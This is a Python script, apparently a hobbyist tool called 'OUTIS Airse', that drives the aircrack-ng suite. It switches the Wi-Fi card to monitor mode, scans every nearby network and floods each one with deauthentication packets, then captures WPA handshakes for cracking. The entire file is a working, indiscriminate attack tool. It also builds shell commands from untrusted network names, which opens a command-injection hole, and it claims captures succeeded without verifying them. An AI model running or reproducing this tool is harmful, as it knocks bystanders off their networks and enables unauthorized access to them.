import os
import subprocess
import time


# Print a message indicating the start of the program
print("pls wait.....")

# Print a welcome message
print("""
  ****************************************
  *            OUTIS Airse               *
  *                                      *
  *  https://github.com/josephgeorge26   *
  ****************************************
""")

def get_wifi_interface():
    try:
        cmd = """iw dev | awk '$1=="Interface"{print $2}'"""
        with open(".wiface.txt", "w") as file:
            subprocess.run(cmd, shell=True, stdout=file, stderr=subprocess.DEVNULL)
        
        with open(".wiface.txt", "r") as file:
            interfaces = [line.strip() for line in file.readlines()]
        
        if interfaces:
            return interfaces[0]
        else:
            return None
    except Exception as e:
        print("Error:", e)
        return None

def put_interface_into_monitor_mode(interface):
    if "mon" in interface:
        print("Interface is already in monitor mode.")
        return interface
    
    try:
        subprocess.run(["sudo", "airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        print("Interface", interface, "is in monitor mode...")
        return interface + "mon"
    except Exception as e:
        print("Error:", e)
        return None

def file_checker():
    file_name = 'scan_results.csv'
    output_dir = 'output'
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    output_file_path = os.path.join(output_dir, file_name)
    if os.path.exists(output_file_path):
        base_name, extension = os.path.splitext(file_name)
        i = 1
        while True:
            new_file_name = f"{base_name}-{str(i).zfill(2)}{extension}"
            new_file_path = os.path.join(output_dir, new_file_name)
            if not os.path.exists(new_file_path):
                return new_file_path
            i += 1
    else:
        return output_file_path

def scan_networks(interface):
    try:
        os.system(f"sudo timeout 5 airodump-ng --output-format csv -w output/scan_results {interface} > /dev/null") 
        print("Scanning for networks...")
        print("Scan complete.")
    except Exception as e:
        print("Error:", e)

def deauth_all(interface, file_name):
    try:
        with open(file_name, "r") as file:
            lines = file.readlines()
        
        networks = []
        for line in lines[2:]:
            parts = line.strip().split(",")
            if len(parts) >= 14:
                bssid = parts[0].strip()
                essid = parts[13].strip()
                if essid:
                    networks.append((essid, bssid))
        
        for essid, bssid in networks:
            print(f"Deauthenticating {essid} ({bssid})")
            try:
                os.system(f"sudo timeout 5s aireplay-ng -D --deauth 0  --ignore-negative-one  -a  {bssid} {str(get_wifi_interface())} > /dev/null &")
                print("Deauthentication command successful.")
                capture_handshake(interface, essid, bssid)  # Pass bssid to capture_handshake
                time.sleep(1)
            except subprocess.CalledProcessError as e:
                print(f"Error deauthenticating {essid} ({bssid}): {e}")
    except Exception as e:
        print("Error:", e)

def capture_handshake(interface, essid, bssid):
    try:
        print(f"Capturing handshake for {essid} ({bssid})...")
        if not os.path.exists("captured_handshakes"):
            os.makedirs("captured_handshakes")
        filename = f"captured_handshakes/{essid}-{bssid}.cap"
        os.system(f"sudo timeout 5 airodump-ng --write {filename} -c 1 --bssid {bssid} {interface} > /dev/null")

        print("Handshake captured.")
    except Exception as e:
        print("Error:", e)

def exiting(interface):
    try:
        os.system(f"sudo airmon-ng stop {interface} >/dev/null")
    except Exception as e:
        print("Error:", e)

def main():
    file_name = file_checker()
    interface = get_wifi_interface()
    if interface:
        monitor_interface = put_interface_into_monitor_mode(interface)
        if monitor_interface:
            scan_networks(monitor_interface)
            deauth_all(monitor_interface, file_name)

            exiting(monitor_interface)
    else:
        print("Could not find wireless interface.")

if __name__ == "__main__":
    main()
